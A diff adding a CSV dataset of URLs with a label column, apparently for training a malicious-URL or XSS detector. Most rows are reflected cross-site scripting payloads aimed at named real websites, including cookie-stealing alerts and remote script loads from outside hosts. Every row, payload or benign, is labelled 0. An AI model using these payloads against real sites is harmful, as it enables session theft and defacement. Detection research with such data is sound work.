@@ -1,0 +1,901 @@
+URLS,label
+"http://webcenters.netscape.compuserve.com/weather/find.jsp?f=""><script>alert(1)</script>",0
+http://www.titivillus.it/periodico.php?id=15%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://english.sinopec.com/investor_center/historyQuery.jsp?d=%22%20onmouseover%3dalert%28document.cookie%29%20abc%3d%22&dayend=23&daystart=23&doSearch=true&endDate=2012-03-06&gid=1&monthend=3&monthstart=3&range=1&startDate=2000-10-19&Submit2=search&yearend=1967&yearstart=1967,0
+http://www.fbi.com/?not_found=%3Ch1%3EXSS%20BY%20Mr.M4D3RS%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://pti.regione.sicilia.it/portal/page/portal/PIR_PORTALE/PIR_LaStrutturaRegionale/PIR_AssessoratoregionaledelleRisorseAgricoleeAlimentari/PIR_DipIntStrutturali/PIR_DipIntStrutturali_News?_piref857_7105408_857_4739684_4739684.strutsAction=/thematicNews.do&month=10&stepThematicNews=month_news&thematicFilter=%22%20%3CSCRIPT%20SRC=http://ha.ckers.org/xss.js%3E%3C/SCRIPT%3E&year=2008,0
+"http://lavillette.com/recherche/?q=<script>document.write(String.fromCharCode(60, 105, 102, 114, 97,109, 101, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 120, 115, 115, 101, 100, 46, 99,111, 109, 34, 62))</script>",0
+http://gmwgroup.harvard.edu/techniques/index.php?topic=http://gmwgroup.harvard.edu/techniques/index.php?topic=<script>alert(document.cookie)</script>,0
+http://cyber.law.harvard.edu/stockspam/public/onemsg.php?symbol=%3Ch1%3E%3Cscript%3Ealert%28/hacked/%29%3C/script%3E%3C/h1%3E&id=58873%22%27--,0
+http://kids.britannica.com/search?query=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22cyb3r_pr3dat0r%22%29%3C%2FSCRIPT%3E%22%3E&fuzzy=true&ct=null&autobounce=true,0
+http://www.dohabank.com.qa/1/db2/SearchResults.aspx?Search=%3C%2fscript%3E%3Cimg%2f*%2500%2fsrc%3d%22worksinchrome%26colon%3bprompt%26%23x28%3b1%26%23x29%3b%22%2f%2500*%2fonerror%3d%27eval%28src%29%27%3E,0
+"https://topup.orange.com/?_lang=""><script>alert(document.cookie)</script>",0
+http://library.leeds.ac.uk/site/scripts/google_results.php?q=bentley&stylesheet=%22%3E%3Cscript%3Ealert%28%27raVen%27%29%3C/script%3E&collections=libcms,0
+http://loadgamesvf.bet365.com/f1x2games/loadGame.jsp?gameID=F1X2_FOOTBALL&version=1&lang=%22en&acc_id=1EC6296318CF49888464BDA22A78EB2C000004&baseURL=%22);%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,0
+"http://www.phishtank.com/phish_screenshot.php?phish_id=%22%3E%3Cinput%20type=submit%20value=CLICK%A0HERE%A0TO%A0TRIGGER%A0XSS!%20onClick=confirm%28navigator.userAgent%29;alert%28/XSS%A0EXAMPLE/.source%29;eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,97,115,115,105,103,110,40,34,104,116,116,112,58,47,47,110,121,97,110,46,99,97,116,34,41));BODY%20BGCOLOR=%22#111111%22%3E",0
+"http://www.maquis-art.com/shop/index.php?page=1&objet_recherche=/""><script>alert('Xss ByAtm0n3r')</script>",0
+"http://www.tasteofsouthflorida.com/cgi-bin/tseekdir.cgi?location=Root-Miami,045Dade_Restaurants-South_Beach%27%3E%3Cscript%3Ealert%28%22Cr4t3r%20Was%20Here%22%29;//%3C/script%3E",0
+"http://www.auto-news.de/sondermodelle/index.jsp?marke=""><script>alert(document.cookie)</script>",0
+http://www.sfelipeneri.edu.ec/fedec/book/guestbook.php?act=show&page=2584&lang=%22%3E%3E%3Cscript%3Ealert%28%22\\_UR0B0R0X_/%22%29%3C/script%3E,0
+"http://www.coolwebscripts.com/search_view_script.php?search=/""><script>alert(1)</script>&cat_drop=&offset=0&toshow=20&GO.x=14&GO.y=14",0
+http://www.deremate.com.ve/venezuela/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.yemen.gov.ye/portal/gov/%D8%A7%D9%84%D8%A3%D8%AE%D8%A8%D8%A7%D8%B1/tabid/959/mid/3178/Default.aspx?SearchTerm=%3Cimg%20src=%27aaa%27%20onerror=alert%281%29%3E,0
+"http://solutions.liveperson.com/landing-pages/live-chat/a2?siteID=%27;alert%28String.fromCharCode%2888,83,83%29%29//\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E",0
+http://www.opera-guide.ch/index.php?uilang=en%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.avis.co.uk/site-search?header-site-search=%27%3E%3Cscript%3Ealert%28+document.cookie%29%3C/script%3E,0
+https://www.mcafeesecure.com/not-certified?host=%22onmouseover%3d%22alert%281%29%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22,0
+http://www.mikrotik.com/shopping.php?sect=%22%3E%3Cscript%3Ealert%28%27v30sharp%27%29;%3C/script%3E,0
+http://9gag.com/signup?method=email&error=%3Cscript%3Ealert%28%27xss!%27%29;%3C/script%3E,0
+"http://www.torrents.net/find/""><script>alert('Xss By Atm0n3r')</script>/",0
+http://www.gtgroup.ge/php_thumb/demo/phpThumb.demo.demo.php/%22onmouseover=prompt%28903901%29%3E,0
+http://www.lukoil.ge/index.php/%22onmouseover=prompt%28980237%29%3E,0
+http://www.narbonne.fr/search/google/%252F%22%3E%3Cscript%20type%3D%22text/javascript%22%20src%3D%22http%3A/%252Fyourjavascript.com/27544112151/xss.atmon3r.js%22%3E%3C/script%3E?query=%2F%22%3E%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fyourjavascript.com%2F27544112151%2Fxss.atmon3r.js%22%3E%3C%2Fscript%3E&cx=013547730913211493630%3Aj69brl4dbyu&cof=FORID%3A11&sitesearch=&hl=fr&lr=lang_fr,0
+http://partners.rt.com/search/hotels/?q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E,0
+"http://skicircus.loop-server.com/unsubscribe.asp?m=1&email=""'>""'><script>window.alert(document.cookie)</script>",0
+http://www.truste.com/blog/2012/001/30/google-competing-on-privacy/%3Cbody%20onload=alert%28%22RM%22%29%3E,0
+http://www.i-mxms.com/SearchResults.aspx?Search=aaa%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+https://www.maybankard.net/SENTRY/PaymentGateway/Application/RedirectLink.aspx,0
+http://webinars.snm.org/viewer.php?meeting_id=%22%3E%27%3E%3CSCRIPT%3Ealert%28%22Hacked%20By%20Ehsan%20Ice%22%29%3C/SCRIPT%3E,0
+http://www.expopakistan.gov.pk/mission-admin/login.php?err=%3Ch1%3EXssed%20by%20NE0%20from%20CyBER-71%20Bangladesh%3C/h1%3E%3Ciframe%20src=//xssed.com%3E,0
+http://www.yesser.gov.sa/custompages/rssfeed.aspx?src=<Script>alert('Nemer Al Nemer must befree')</script>,0
+http://www.sp.senac.br/jsp/search.jsp?newsID=DYNAMIC%2Coracle.br.dataservers.SearchDataServer%2CselectContent&template=477.dwt&context=A&keywords=%22%2Balert%28%27hi%27%29%2B%22&testeira=453,0
+http://www.eia.org.uk/view.php?id=948%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.onradio.gr/player.php?id=229%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.readyicons.com/iconset-preview.php?id=11%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+"http://118.tct.ir/exe/<ScrIpT>alert(String.fromCharCode(97, 51, 113))</ScRipT>",0
+http://www.steuerbuero-wintz-potrafke.de/modules/inbetween/editor/plugins/imanager/scripts/popup.php?url=http://data.xssed.org/images/xssed_logo.gif,0
+http://service.meltwaternews.com/mnews/redirect.html?docId=2015493866&userId=613802&agentId=483135&type=2&s=155732&url=http://www.xssed.com,0
+http://www.taartmeteenlindtje.nl/item.php?id=16%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.suagacollection.com/photo-gallery.php?id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.integrativetherapy.com/en/articles.php?id=32%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://old.cageprisoners.com/articles.php?id=25632%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://www.marchantbrothers.co.uk/mix.php?id=-61%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://artslivres.com/ShowArticle.php?Id=1%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://sonica.speedy.com.ar/resultado_busqueda.php?Tipo=1&Texto=%22%3E%3CscRipt%3Ealert%28%2FXss%2F%29%3C%2FScRIPT%3E,0
+http://registration.ge/includes/custom/checkNs.php?nsServers=1%3CScRiPt%20%3Eprompt%28934165%29%3C%2fScRiPt%3E,0
+"http://apps.facebook.com/caricatura/view.php?friend=501337&effect=&x=&y=""/><iframesrc=\0x27http://xssed.com></iframe>",0
+http://www.e-planning.net/en/img/banners/logos.swf?clickTag=http://xssed.com,0
+http://www.nanocem.org/fileadmin/banners/NanocePartnetBanner.swf?clickTAG=http://xssed.com,0
+http://www.soarcareers.com/uploads/flash/120x240_desert.swf?clickTAG=http://xssed.com,0
+http://www.channel4learning.com/support/global/header/banner/C4L_V1.swf?clickTag=http://xssed.com,0
+http://www.azom.com/ads/Banners/fibrestone728x90.swf?clickTAG=http://lotion.110mb.com,0
+http://www.azooptics.com/ads/Banners/NEXT_cake.swf?clickTAG=http://lotion.110mb.com,0
+"http://www.policybazaar.com/Application_Masters/IN/Images/ADBANNERS/200x150.swf?clickTag=javascript:alert(""XSSED"");",0
+"http://www.nexans.in/Corporate/2007/fttx_v2_2.swf?clickTAG=javascript:alert(""XSSED"");",0
+"http://www.imagebankexpress.com/4615/Chicken-TR/chickvid-720x300-p69-clicktag-tr.swf?clickTag=http://www.imagebankexpress.com/4615/Chicken-TR/chickvid-720x300-p69-clicktag-tr.swf?clickTag=javascript:alert(""XSSED"");",0
+"http://www.bharatstudent.com/images/banners/120x600/mtv6-160x600.swf?clickTag=javascript:alert(""XSSED"");",0
+"http://aol.pogo.com/images/togo/flash/sltg-ww-underground.swf?clickTag=javascript:document.write('<script>alert(""xss by m4x"")</script><font size=""7"" color=""red""><marquee>XSS BY M4X</marquee></font>')",0
+http://www.nba.com/media/nba_asb06_750x26_v03.swf?clicktag=javascript:alert(document.location),0
+http://tw.yimg.com/a/tw/wenchuan/440x160_JM_ipod.swf?clickTAG=http://google.com,0
+http://us.a2.yimg.com/us.yimg.com/a/ya/yahoo_food/20061107_77996_1_180x150_rec_food_mealplanner.swf?clickTAG=javascript:alert(document.cookie),0
+http://images.neopets.com/ncmall/get_neocash_button_trans.swf?ilang=en&clickTag=http://google.com,0
+http://www.bankier.pl/gfx/centrum/kreacje/ge/ge_boks_350x100_v4_2.swf?clickTag=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27),0
+http://ads.yimg.com/a/a/ya/yahoo_camp/596307_092707_180x150_invite.swf?clickTAG=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27),0
+http://www.laudaair.com/site/typo3conf/ext/og_promo/res/xmas.swf?clicktag=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27),0
+http://www.immodirekt.at/pics/uploads/diepresse_click.swf?clickTag=javascript:window.open('http://www.xssed.com'); alert('XSSED by Viper.aT'),0
+http://m.fotolog.com/search.php?auth=%3Ch1%3ERME%20Pwnea%20de%20Nuevo%3C/h1%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%3Cnoscript%3E,0
+http://ns31.ashiyanehost.com/admin/views/bad_refferer.php?<script>alert('LastRider-CyberBellona')</script>,0
+http://wdt.weather.fox.com/currentWeatherPage/shortTerm.php?STATE=FL&CITY=Jacksonville%22%3E%3C/iframe%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,0
+"http://xfinity.comcast.net/news/national/%27%3C/script%3E%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E/",0
+https://locate.apple.com/sales/?pt=all&lat=34.2547239&lon=-93.8283586,0
+http://receptome.stanford.edu/hpmr/SearchDB/findGenes.asp?textName=%3Cscript%3Ealert%28%22zargar%20yasir%22%29%3C%2Fscript%3E,0
+http://byinvitationonlyphotos.americanexpress.com/photo.php?img=7259%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E&p=680%27&intlink=BIO_Twitter,0
+http://www.dictation.philips.com/index.php?id=39&imageId=1744%27&CC=%27%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,0
+http://servicios.aol.com/content/astrologia/horoscopo/horoscopos/widget/horoscopos.php?Fecha=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,0
+http://reg.email.163.com/mailregAll/checkreg.do?username=yes&domain=163.com&sid=lCLGlQWaIQwqPYAODAaaBLsMFDjOKwOW&uid=yes%40163.com&host=webmail.mail.163.com&ver=js4&callback=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E,0
+https://idp.godaddy.com/login.aspx?ci=10530&spkey=GDSWNET-P3PWCORPWEB137&redirect=true&target=http://www.xssed.com,0
+"https://dx.com/s/car.html?GEPrice=1.00&LEPrice="" onmouseover=""alert(123)"" x=""HOVER THE RELEASE DATELINKS DOWN TO THE LEFT&category=712",0
+http://wikileaks.org/plusd/index.php?q=%22jared+cohen%22&qforigin=%27%22--%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert%28%22XSS%20BY%20THEXUGJ%22%29%3C/scRipt%3E,0
+http://thesaurus.com/browse/asd%22%3C/title%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+http://support.lexmark.com/index?page=answers&startover=y&locale=en&userlocale=EN_US&question=%3Ciframe%20src%3Dhttp%3A%2F%2Fxssed.com%3E,0
+http://ponsel-online.com/index.php?action=store.showProduct&product_id=<script>alert(31337);</script>,0
+http://www.shopparos.gr/results.asp?q=%22%3C/TITLE%3E%3CSCRIPT%3Ealert%28%22xss%20by%20d@ydream%22%29;%3C/SCRIPT%3E,0
+http://www.enjoy.net.mm/detail/detail.php?id=11472&type=news%27%22%3E%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E,0
+http://chemicaltechnologyinc.com/search.php?type=Products&name=234G%22%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E%3E,0
+http://www.jaring.my/selfcare/index.cfm?cont=error&skip=1&type=noentry&msg=%22%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E%3E&CFID=518552,0
+http://www.seagfoffice.org/news_view.php?id=13%27%3E%3Cscript%3Ealert%28%22xss%22%29%3C/script%3E,0
+http://www.ads.com.mm/error?message=%27%3E%3Cscript%20src=http://www.planetcreator.net/attacking/xss/planetcreator-xss.js%3E%3C/script%3E,0
+http://www.dolby.com/us/en/sitesearch/index.aspx?q=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E,0
+"http://www.xe.gr/search?System.type=xe_stelexos&Publication.freetext=<iframe src=""http://xssed.com"">",0
+"http://www.kcna.kp/kcna.user.home.photo.retrievePhotoList.kcmsf?article_code=&article_type_list=&news_type_code=&show_what=&mediaCode=\'"")</script><script>document.body.innerHTML = ""<h1>Please StopThe Nuclear War Threats | Hi From Greece!</h1><iframe/src=http://www.youtube.com/embed/VJNBfBr-OGUwidth=1600 height=800allowfullscreen>"";</script>;('&features_lang=1&exploit_lang=--C/script%3E%3b%28%27&features_lang=1&exploit_lang=--",0
+http://www.athinorama.gr/redirect/links.aspx?page=http://xssed.com,0
+https://cms.paypal.com/cms_content/US/en_US/files/marketing_us/pp101_HowPPWorks_player.swf?config=%3CIMG%20SRC=%22http://demo.offcon.org/test.PNG%22%3E&debug=false,0
+http://www.ebay.com/itm/181023275832?ssPageName=STRK:MESELX:IT&_trksid=p3984.m1555.l2649,0
+http://www.ebay.com/itm/ws/eBayISAPI.dll?ViewItem&rt=nc&item=181023275832&si=gGZ3pf0PeJXSxz0i4IMd7G4Xu2Q%3D&print=all&category=172602,0
+http://www.paid-to-promote.net/member/signup.php?r=%22%3E%3Cscript%3Ealert%28%22Xssed%20By%20Talented%20Fool%22%29;%3C/script%3E,0
+http://www.si-wifi.org/send_mail.php?to=PEJPRFkgb25sb2FkPSJhbGVydCgnc2hlbGxjMGRlJyk7Ij4=&ID=1,0
+http://www.wattpad.com/stories/search/a%2522%253E%253Cscript%253Ealert%28document.cookie%29%253C%252Fscript%253E,0
+http://www.mercadolivre.com.pt/portugal/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+"http://www.phpriot.com/search?q=/""><script>alert('Xss By Atm0n3r')</script>&x=47&y=14",0
+http://www.thebestdata.com/zoom.aspx?menutype=1&auto=3240&t=ssssssssssss%22%3E%3Cimg%20src=x%20onerror=alert%28%27XSSED%27%29%3E,0
+http://www.mercadolivre.pt/portugal/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.cl/chile/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.nationwide2u.com/v2/cgi-bin/trackbe.cfm,0
+"http://www.gngfootball.org/chat/upgrade.php?step=4%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+"http://www.brancopelle.com/X7Chat/install.php?step=2%22%3E%3Cscript%3Ealert%28String.fromCharCode%2867,114,52,116,51,114,32,87,97,115,32,72,101,114,101%29%29%3C/script%3E",0
+http://www.ct-park.ge/index.php/%22onmouseover=prompt%28960350%29%3E,0
+"http://smarty.incutio.com/?action=find&find=/""><script>alert('Xss By Atm0n3r')</script>",0
+http://www.alarabiya.net/mmGallery.php?id=10&name=%22%3E%3Cfont+size=55+color=red%3EHacked%20By+OXO%3C/font%3E%3Cscript%3Ealert%28/OXO/%29%3C/script%3E,0
+https://profile.callofduty.com/p/login.act?redirectUrl=%22;%20alert%28%22XSS%20By%20SquirmyBeast%22%29;%20XSS=%22Fuck%20Yeah;,0
+"http://www.skirmish-islands.com/inscription.php?w=1/""><script>alert('Xss By Atm0n3r')</script>",0
+http://www.grass-arts.com/shop.php?image=38%22%3E%3Ciframe%20src=http://r14nulr00t.blogspot.com%20%3C/iframe%3E,0
+http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolivre.com.br/brasil/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.pa/panama/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.do/dominicana/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.ec/ecuador/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.mx/mexico/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.co/colombia/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.pe/peru/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.mercadolibre.com.ar/argentina/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E,0
+http://www.pingplace.nl/forum/active.php,0
+http://www.universinet.it/components/com_feedpostold/feedpost.php?url=http://r14nulr00t.blogspot.com,0
+http://edition.cnn.com/search/index.html?sortBy=date&primaryType=mixed&source=money&query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E,0
+http://money.cnn.com/search/index.html?sortBy=date&primaryType=mixed&source=money&query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E,0
+http://www.hp.com/cgi-bin/hpinfo/cserreport.cgi,0
+http://c2.com/cgi/wiki?edit=%22%3E%3Cscript%3Ealert%28%22http://st2tea.blogspot.com%22%29%3C/script%3E,0
+http://www.delicious.com/redirect?url=http://www.bing.com,0
+http://www.venstre.dk/soegning/,0
+http://outlink.webkicks.de/dref.cgi?job=dref&url=http://www.google.de,0
+http://www.cedricdelsaux.com/cedric_delsaux.php?lang=en');alert('xss');//,0
+"http://www.arcor.de/content/senden.jsp?to=""><script>alert(document.cookie)</script>&Headline=x&URL=x&Datum=x&Teasertext=x",0
+"http://www.kicker.de/community/login/?nickname=""style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:247px;height:96pxonmouseover=alert(document.cookie) """,0
+http://www.chefkoch.de/login.php,0
+"http://www.computerbild.de/cb/ekf/Suchergebnis.html?cpdb_cid=""><script>alert(document.cookie)</script>",0
+"http://www.tradeindia.com/search/product_search.html?search_form_id=18&keyword=""/><script>alert(""Xss: Vijayendra"")</script>&criteria=product&submit.x=0&submit.y=0",0
+http://l8url.com/,0
+"http://www.sicherheit.info/SI/cms.nsf/si.Articles.Search?SearchView&Query=""><script>alert(document.cookie)</script>",0
+http://www.salesforce.com/servlet/servlet.WebToLead,0
+"http://www.speakingtree.in/peoples.php?keyword=""/><script>alert(""Xss:Vijayendra"")</script>&search_type=all&x=0&y=0",0
+http://www.utsc.utoronto.ca/~registrar/calendars/calendar04/search.cgi,0
+http://moviesmobile.net/hollywood-mobile-movies/kfp2/index.php,0
+http://www.imvisible.info/contact-us.php,0
+http://boom.ge/search.php?query=1%3Cscript%3Eprompt%28922755%29%3C/script%3E,0
+"http://www.ibk.co.kr/common/error/browser.jsp?returnURL=""><script>alert(document.cookie)</script>",0
+"http://gaana.com/#/playlists/""/></script><script>alert(""Xss: Vijayendra"")</script>",0
+"https://www.securitymetrics.com/termsofusedialog.adp?acceptdestination=firewalltest43e51""style%3d""x%3aexpression(alert('XSS'))""51478e4c6c4b42e72&email=lol@lol.com&SUBMIT=Next+-%3e&declinedestination=firewalltest",0
+"http://jqueryui.com/themeroller/#ffDefault=""/><script>alert(/Xss: Vijayendra/)</script>",0
+http://harajiharaji.com/login.php,0
+"https://apply.mcdonalds.com.au/public/index.cfm?action=applicantLogin&returnTo=/%22%3E%3C/object%3E%3C/script%3E%3C/title%3E%3Cimg%20src=1%20onerror=alert%281337%29%3E&Share|LikenSnoopy%20and%20Slice228%20like%20this.wWw.Scoala-De-Soferi.hi2.RoQuick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2008:47%20AM%20#2pr0totypEpr0totypE%20is%20offlineRegistered%20user%20Bautor%20de%20bere%20Array%20pr0totypE%27s%20AvatarJoin%20DateNov%202011LocationYou%20can%27t%20find%20me;%20I%20can%20only%20find%20you.......Certainly%20is%20that%20CHUCK%20NORRIS%20can%20find%20us%20both%20:%29%29%29Posts37Rep%20Power0Send%20a%20message%20via%20Yahoo%20to%20pr0totypEDefaultCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Share|LikeNu%20sunt%20foarte%20inteligent,%20dar%20sunt%20pe%20cat%20se%20poate%20de%20corect.[TuToriaL%20FlooD%20IP]Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2009:53%20AM%20#3GeckoGecko%20is%20online%20nowDesigner%20Cultul%20betivilor%20Array%20Gecko%27s%20AvatarJoin%20DateMar%202011LocationLocation,%20location,%20location...Posts1,182Rep%20Power2DefaultQuote%20Originally%20Posted%20by%20pr0totypE%20View%20PostCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Printr-un%20atac%20XSS%20poti%20injecta%20cod%20javascript%20in%20o%20pagina%20web%20direct%20in%20address%20bar.%20Majoritatea%20oamenilor%20folosesc%20acest%20atac%20pentru%20a%20fura%20parolele%20salvate%20in%20calculatoarelor%20victimelor.Acel%20onerror=%22alert%281337%29%22%20executa%20cod%20JavaScript.Share|Like%22Take%20your%20time%20and%20do%20your%20best!%22Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20MessageRe:%20[Xss]%20McDonalds01-04-2012,%2009:54%20AM%20#4pr00fpr00f%20is%20offlineRegistered%20user%20Bautor%20de%20absinth%20ArrayJoin%20DateDec%202010Posts765Rep%20Power3DefaultQuote%20Originally%20Posted%20by%20pr0totypE%20View%20PostCe%20face?%20E%20doar%20un%20link%20spre%20o%20pagina%20cu%20angajari%20de%20la%20Mac?Cross-site%20scripting%20-%20Wikipedia,%20the%20free%20encyclopediaIgnoran%C8%9Ba%20nu%20aduce%20cuno%C8%99tin%C8%9Be.%20Precum%20%C8%99i%20fonturile%20colorate.Share|LikeYour%20mother%20is%20so%20fat,%20the%20recursive%20function%20computing%20her%20mass%20causes%20a%20stack%20overflow.Quick%20reply%20to%20this%20message%20Reply%20%20%20Reply%20With%20Quote%20Reply%20With%20Quote%20%20%20Multi-Quote%20This%20Message",0
+http://boom.ge/advanced_search.php?query=%22%20onmouseover%3dprompt%28907660%29%20bad%3d%22,0
+http://www.computershop.ge/index.php/%22onmouseover=prompt%28929933%29%3E,0
+http://www.alta.com.ge/eng/products.php?action=details&id=33539%22%3E%3Cscript%3Ealert%28/sucks/%29%3C/script%3E,0
+http://ec.europa.eu/justice/fdad/cms/stopdiscrimination/config/searchresult.html?query=%3Cbr/%3E%3Ch1%3EClassification%20of%20Humans%3C/h1%3E%201%20real%20item%20found%20:%3Cbr/%3E%3Cimg%20src=%22http://3.bp.blogspot.com/-Vx_myZeyHJM/ThZgAK5etcI/AAAAAAAAIP4/8CJLtUlti5I/s1600/tintin-au-congo-decision-le-5-mai-2010-01.jpg%22/%3E&x=11&y=7,0
+http://www.mmorpg.com/account_tools.cfm,0
+http://www.dream-prez.com/?page=livredor,0
+http://www.downloadatoz.com/_win8/member/login.php,0
+http://forum.alsacreations.com/topic.php?tid=30093,0
+http://www.aziaclub.com/passwd.php,0
+https://extranet.biskot.com/login.php,0
+http://music.raag.fm/search.php?search_string=%27%22%3E%3Cscript%3Ealert%28%2Fhacked%2F%29%3C%2Fscript%3E&search_type=singer,0
+http://www.forexticket.fr/fr/conversion/monnaie-EUR-USD,0
+http://duvidas.pandasecurity.com.br/index.php?bp=50|77|2|51|2&View=search&q=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E&s=1&sb=Procurar,0
+http://ultimateintern.monsterenergy.com/facebook/entries.php?search=%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E,0
+http://web.sa.mapquest.com/mobil1/?tempset=search%20%3Ciframe%20src=%22http://xssed.com%22%3E,0
+http://hms.harvard.edu/faculty-search/?FirstName=%3C/h2%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E&LastName=%3Cscript%3Ealert%28/xss2/%29%3C/script%3E&s=1,0
+http://www.sabteahval.ir/Page.aspx?search=%22%3E%3Cscript%3Ealert%28/amir/%29%3C/script%3E&mID=1290&Page=search/advancedsearch&mDefId=,0
+http://support.hostgator.com/articles/affiliates/how-long-do-i-have-to-wait-to-start-as-a-hostgator-affiliate,0
+http://www.120.li/search.php?cityid=0&keywords=%22%27/%3E%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E,0
+"http://www.shop.nsw.gov.au/online_payments.jsp?url=./"" onload=""alert(/xss/)",0
